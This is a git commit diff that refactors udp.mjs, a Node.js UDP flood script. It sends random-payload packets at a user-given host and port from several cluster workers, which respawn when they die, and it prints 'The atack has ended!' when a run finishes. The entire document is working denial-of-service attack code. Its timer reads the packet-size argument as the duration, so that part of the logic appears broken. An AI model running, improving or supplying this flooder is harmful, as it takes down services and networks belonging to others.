b3be203cd772a304df9a6b071c8fcbee09e7b943
Zachery T. Eritano <60812567+DexeHecimal@users.noreply.github.com>
2023-03-31 16:01:33 -0400

    Update udp.mjs

--- udp.mjs
+++ udp.mjs
@@ -1,36 +1,18 @@
-/*
-    Must run with Node version 16.x.x or later. ESX mode requires a minimum of version 14+.
-    - Fully featured string to destination user datagram flood.
-*/
-
 import dgram from 'node:dgram';
-import cluster from 'node:cluster'; // multi-threading library.
+import cluster from 'node:cluster';
 const sock = dgram.createSocket('udp4');
 
-// if the user specifies 0, we will modify the value of our process arguments randomly.
-process.argv[3] = process.argv[3] == 0 ? Math.floor(Math.random() * (65535 - 1024 + 1)) + 1024 : process.argv[3];
-process.argv[4] = process.argv[4] == 0 ? Math.floor(Math.random() * (1428 - 1024 + 1)) + 5 : process.argv[4];
-
-function randStr(size) {
-    let buffer = [];
-    for (let b = 0; b < size; b++) {
-      buffer[b] = String.fromCharCode(Math.floor(Math.random() * 26) + 65);
-    } return buffer.join('');
-}
-
-// generate the random alphanum string to send.
-const attackBuffer = randStr(parseInt(process.argv[4]));
-
-function udpFlood(host, port, length) {
-    sock.send(attackBuffer, 0, length, port, host, (err) => {
-        if (err !== null) {
-            console.error(`Error encountered!: ${err}`);
-        }
+function errorHandler() {
+    process.on('uncaughtException', err => {
+        return console.error(err, "Uncaught Exception thrown!");
+    });
+    
+    process.on('unhandledRejection', (rej, p) => {
+        return console.error(rej, "Uncaught Rejection at Promise! ", p);
     });
 }
 
 if (cluster.isPrimary) {
-    // main-thread specified here.
     if (process.argv.length < 6) {
         console.log(`Usage: node ${process.argv[1]} [host] [port, (0 for random)] [size, (0 for random)] [time] [extra-threads]`);
         process.exit(1);
@@ -43,27 +25,48 @@ if (cluster.isPrimary) {
         worker.setMaxListeners(0);
         worker.send({ message: "start" });
     }
-    
-    // instructions for future process threads.
+
     cluster.on('exit', (worker, code, signal) => {
         console.log(`Worker ${worker.process.pid} died with code ${code} and signal ${signal}`);
         const newWorker = cluster.fork();
         newWorker.setMaxListeners(0);
         newWorker.send({ message: "start" });
     });
+    errorHandler();
 } else {
-    // to be threaded.
+    process.argv[3] = process.argv[3] == 0 ? Math.floor(Math.random() * (65535 - 1024 + 1)) + 1024 : process.argv[3];
+    process.argv[4] = process.argv[4] == 0 ? Math.floor(Math.random() * (1428 - 1024 + 1)) + 5 : process.argv[4];
+    
+    function randStr(size) {
+        let buffer = [];
+        for (let b = 0; b < size; b++) {
+          buffer[b] = String.fromCharCode(Math.floor(Math.random() * 26) + 65);
+        } return buffer.join('');
+    }
+    
+    // generate the random alphanum string to send.
+    const attackBuffer = randStr(parseInt(process.argv[4]));
+    
+    function udpFlood(host, port, length) {
+        sock.send(attackBuffer, 0, length, port, host, (err) => {
+            if (err !== null) {
+                console.error(`Error encountered!: ${err}`);
+            }
+        });
+    }
+
     process.on('message', (msg) => {
         if (msg.message === "start") {
             let flood = setInterval(() => {
                 udpFlood(process.argv[2], parseInt(process.argv[3]), parseInt(process.argv[4]));
             });
-            
+
             setTimeout(() => {
                 clearInterval(flood);
                 console.log("The atack has ended!\n");
                 process.exit(1);
-            }, process.argv[4] * 1000); // normally, this is ms, we converted it to seconds. setTimeout() clears the interval, and ends the attack per thread.
+            }, process.argv[4] * 1000);
         }
     });
+    errorHandler();
 }
